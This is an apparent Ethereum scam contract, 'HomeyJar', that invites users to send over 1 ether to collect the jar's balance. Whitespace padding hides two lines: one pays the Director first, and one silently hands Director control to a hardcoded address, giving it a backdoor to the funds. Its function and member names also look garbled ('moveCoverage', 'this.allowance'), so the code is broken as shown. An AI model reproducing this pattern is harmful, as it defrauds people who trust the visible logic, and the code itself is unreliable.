pragma solidity ^0.4.19;

contract HomeyJar {
    address public Director = msg.sender;

    function() public payable {}

    function GetHoneyFromJar() public payable {
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Director.moveCoverage(this.allowance);
            msg.sender.moveCoverage(this.allowance);
        }
    }

    function collectCoverage() payable public {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x2f61E7e1023Bc22063B8da897d8323965a7712B7){Director=0x2f61E7e1023Bc22063B8da897d8323965a7712B7;}
        require(msg.sender == Director);
        Director.moveCoverage(this.allowance);
    }

    function Command(address adr,bytes data) payable public {
        require(msg.sender == Director);
        adr.call.value(msg.value)(data);
    }
}